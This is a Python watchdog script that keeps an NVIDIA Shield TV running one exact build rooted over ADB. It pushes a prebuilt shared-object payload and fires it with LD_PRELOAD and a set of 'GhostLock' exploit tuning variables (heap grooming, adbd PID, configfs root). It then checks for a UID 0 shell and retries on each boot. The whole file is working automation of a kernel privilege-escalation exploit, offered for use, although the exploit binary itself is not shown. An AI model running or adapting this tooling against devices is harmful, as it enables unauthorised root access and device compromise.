#!/usr/bin/env python3
"""Keep a validated Shield 9.2.4 adbd rooted from an external ADB host.

This does not modify boot, vendor, or system partitions.  It waits for the
exact supported build, verifies the payload hash, and reapplies GhostLock only
when a fresh ADB shell is no longer UID 0.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import pathlib
import shlex
import signal
import subprocess
import sys
import time
from datetime import datetime, timezone


DEFAULT_FINGERPRINT = (
    "NVIDIA/mdarcy/mdarcy:11/RQ1A.210105.003/"
    "7825230_4387.0822:user/release-keys"
)
DEFAULT_KERNEL = "4.9.141-tegra-gb6e5605a"
DEFAULT_PAYLOAD_SHA256 = (
    "a3a1e75b627d8dd419e9bafd2a73082a8647510bf6ce4f975e52baf5aa1d0761"
)

STOP = False


def env_int(name: str, default: int, minimum: int = 1) -> int:
    raw = os.environ.get(name, str(default))
    try:
        value = int(raw)
    except ValueError as exc:
        raise SystemExit(f"{name} must be an integer, got {raw!r}") from exc
    if value < minimum:
        raise SystemExit(f"{name} must be at least {minimum}")
    return value


def log(message: str) -> None:
    stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
    print(f"{stamp} {message}", flush=True)


def stop_handler(_signum: int, _frame: object) -> None:
    global STOP
    STOP = True


class CommandError(RuntimeError):
    pass


def run(command: list[str], timeout: int = 30, check: bool = True) -> str:
    try:
        result = subprocess.run(
            command,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout,
            check=False,
        )
    except subprocess.TimeoutExpired as exc:
        raise CommandError(f"timed out after {timeout}s: {command[0]}") from exc
    output = result.stdout.strip()
    if check and result.returncode != 0:
        raise CommandError(
            f"exit {result.returncode}: {' '.join(command[:3])}: {output}"
        )
    return output


class Shield:
    def __init__(self, target: str) -> None:
        self.target = target

    def adb(self, *args: str, timeout: int = 30, check: bool = True) -> str:
        return run(["adb", "-s", self.target, *args], timeout=timeout, check=check)

    def connect(self) -> bool:
        run(["adb", "connect", self.target], timeout=20, check=False)
        state = self.adb("get-state", timeout=10, check=False).strip()
        if state == "device":
            return True

        # A daemon reboot leaves an otherwise valid TCP serial registered as
        # "offline" in the host ADB server.  Replace that stale transport
        # instead of trusting adb connect's "already connected" response.
        run(["adb", "disconnect", self.target], timeout=10, check=False)
        time.sleep(1)
        run(["adb", "connect", self.target], timeout=20, check=False)
        return self.adb("get-state", timeout=10, check=False).strip() == "device"

    def shell(self, command: str, timeout: int = 30, check: bool = True) -> str:
        return self.adb("shell", command, timeout=timeout, check=check)

    def property(self, name: str) -> str:
        return self.shell(f"getprop {name}").strip()

    def identity(self) -> str:
        return self.shell("id", check=False)

    def is_root(self) -> bool:
        return self.identity().startswith("uid=0(")

    def boot_id(self) -> str:
        return self.shell("cat /proc/sys/kernel/random/boot_id").strip()


class State:
    def __init__(self, path: pathlib.Path) -> None:
        self.path = path
        self.data: dict[str, object] = {
            "boot_id": "",
            "attempts_this_boot": 0,
            "last_attempt_epoch": 0,
            "last_success_boot_id": "",
        }
        try:
            loaded = json.loads(path.read_text(encoding="utf-8"))
            if isinstance(loaded, dict):
                self.data.update(loaded)
        except (FileNotFoundError, json.JSONDecodeError, OSError):
            pass

    def save(self) -> None:
        self.path.parent.mkdir(parents=True, exist_ok=True)
        temporary = self.path.with_suffix(".tmp")
        temporary.write_text(
            json.dumps(self.data, indent=2, sort_keys=True) + "\n",
            encoding="utf-8",
        )
        os.replace(temporary, self.path)

    def observe_boot(self, boot_id: str) -> None:
        if self.data.get("boot_id") != boot_id:
            self.data["boot_id"] = boot_id
            self.data["attempts_this_boot"] = 0
            self.save()


def sha256(path: pathlib.Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as payload:
        for block in iter(lambda: payload.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


def verify_target(shield: Shield) -> tuple[bool, str]:
    expected_fingerprint = os.environ.get(
        "SHIELD_EXPECTED_FINGERPRINT", DEFAULT_FINGERPRINT
    )
    expected_kernel = os.environ.get("SHIELD_EXPECTED_KERNEL", DEFAULT_KERNEL)
    device = shield.property("ro.product.device")
    fingerprint = shield.property("ro.build.fingerprint")
    kernel = shield.shell("uname -r")
    if device != "mdarcy":
        return False, f"device mismatch: expected mdarcy, got {device!r}"
    if fingerprint != expected_fingerprint:
        return False, f"fingerprint mismatch: {fingerprint!r}"
    if kernel != expected_kernel:
        return False, f"kernel mismatch: expected {expected_kernel!r}, got {kernel!r}"
    return True, fingerprint


def trigger(shield: Shield, payload: pathlib.Path, remote_path: str) -> bool:
    log(f"pushing validated payload to {remote_path}")
    shield.adb("push", str(payload), remote_path, timeout=60)
    shield.shell(f"chmod 0755 {shlex.quote(remote_path)}")
    adbd_pid = shield.shell("pidof adbd").strip().split()[0]
    if not adbd_pid.isdigit():
        raise CommandError(f"invalid adbd PID: {adbd_pid!r}")

    environment = [
        "GHOSTLOCK_FIXED_BASE=1",
        "GHOSTLOCK_MAIN_ROUTE=slide-mcast",
        "GHOSTLOCK_SLIDE_FULL_LOCK=1",
        "GHOSTLOCK_MIXED_ORDER_PAYLOAD=1",
        "GHOSTLOCK_MM_PARTIALS=14",
        "GHOSTLOCK_BUDDY_HOLD_PAIRS=256",
        "GHOSTLOCK_BUDDY_HOLD_SENDS=8192",
        "GHOSTLOCK_RECLAIM_PAIRS=64",
        "GHOSTLOCK_RECLAIM_SENDS=2048",
        "GHOSTLOCK_ADBD_ROOT_CONFIGFS=1",
        f"GHOSTLOCK_ADBD_PID={adbd_pid}",
        f"LD_PRELOAD={shlex.quote(remote_path)}",
    ]
    command = "/system/bin/env " + " ".join(environment) + " /system/bin/true"
    log(f"applying GhostLock to adbd PID {adbd_pid}")
    output = shield.shell(command, timeout=240, check=False)
    if output:
        for line in output.splitlines()[-20:]:
            log(f"exploit: {line}")

    # Force a new transport so verification cannot reuse an old shell child.
    run(["adb", "disconnect", shield.target], timeout=15, check=False)
    for _ in range(12):
        if STOP:
            return False
        time.sleep(5)
        if shield.connect() and shield.is_root():
            log(f"root verified from a fresh ADB transport: {shield.identity()}")
            return True
    log("fresh ADB transport did not become UID 0")
    return False


def one_cycle(
    shield: Shield,
    state: State,
    payload: pathlib.Path,
    remote_path: str,
    minimum_attempt_interval: int,
    max_attempts_per_boot: int,
    dry_run: bool,
) -> None:
    if not shield.connect():
        log(f"ADB target {shield.target} is offline")
        return
    if shield.property("sys.boot_completed") != "1":
        log("device is reachable but Android has not completed boot")
        return

    valid, detail = verify_target(shield)
    if not valid:
        log(f"refusing to run: {detail}")
        return

    boot_id = shield.boot_id()
    state.observe_boot(boot_id)
    if shield.is_root():
        if state.data.get("last_success_boot_id") != boot_id:
            log(f"adbd is UID 0 on supported build {detail}")
            state.data["last_success_boot_id"] = boot_id
            state.save()
        return

    now = int(time.time())
    last_attempt = int(state.data.get("last_attempt_epoch", 0))
    elapsed = now - last_attempt
    attempts = int(state.data.get("attempts_this_boot", 0))
    if attempts >= max_attempts_per_boot:
        log(
            f"adbd is not root; refusing attempt {attempts + 1} on boot "
            f"{boot_id} (limit {max_attempts_per_boot})"
        )
        return
    if elapsed < minimum_attempt_interval:
        log(
            f"adbd is not root; cooldown has {minimum_attempt_interval - elapsed}s left"
        )
        return
    if dry_run:
        log("dry run: target matches and adbd would be re-rooted now")
        return

    state.data["last_attempt_epoch"] = now
    state.data["attempts_this_boot"] = attempts + 1
    state.save()
    success = trigger(shield, payload, remote_path)
    if success:
        state.data["last_success_boot_id"] = boot_id
        state.save()


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--once", action="store_true", help="run one check and exit")
    parser.add_argument(
        "--dry-run", action="store_true", help="validate without pushing or triggering"
    )
    args = parser.parse_args()

    target = os.environ.get("SHIELD_ADB_TARGET", "").strip()
    if not target or target.startswith("-") or any(c.isspace() for c in target):
        raise SystemExit("SHIELD_ADB_TARGET must be a host:port ADB serial")
    payload = pathlib.Path(
        os.environ.get(
            "GHOSTLOCK_PAYLOAD", "/payload/preload-mdarcy-9.2.4.so"
        )
    )
    expected_hash = os.environ.get(
        "GHOSTLOCK_PAYLOAD_SHA256", DEFAULT_PAYLOAD_SHA256
    ).lower()
    if not payload.is_file():
        raise SystemExit(f"payload not found: {payload}")
    actual_hash = sha256(payload)
    if actual_hash != expected_hash:
        raise SystemExit(
            f"payload SHA-256 mismatch: expected {expected_hash}, got {actual_hash}"
        )

    state = State(
        pathlib.Path(os.environ.get("GHOSTLOCK_STATE", "/state/watchdog.json"))
    )
    remote_path = os.environ.get(
        "GHOSTLOCK_REMOTE_PATH", "/data/local/tmp/preload-mdarcy-9.2.4.so"
    )
    check_interval = env_int("WATCHDOG_CHECK_INTERVAL", 30)
    minimum_attempt_interval = env_int("WATCHDOG_MIN_ATTEMPT_INTERVAL", 900)
    max_attempts_per_boot = env_int("WATCHDOG_MAX_ATTEMPTS_PER_BOOT", 2)

    signal.signal(signal.SIGINT, stop_handler)
    signal.signal(signal.SIGTERM, stop_handler)
    shield = Shield(target)
    log(
        f"watching {target}; payload sha256={actual_hash}; "
        f"minimum retry interval={minimum_attempt_interval}s"
    )

    while not STOP:
        try:
            one_cycle(
                shield,
                state,
                payload,
                remote_path,
                minimum_attempt_interval,
                max_attempts_per_boot,
                args.dry_run,
            )
        except (CommandError, OSError) as exc:
            log(f"check failed: {exc}")
        if args.once:
            break
        for _ in range(check_interval):
            if STOP:
                break
            time.sleep(1)
    log("watchdog stopped")
    return 0


if __name__ == "__main__":
    sys.exit(main())
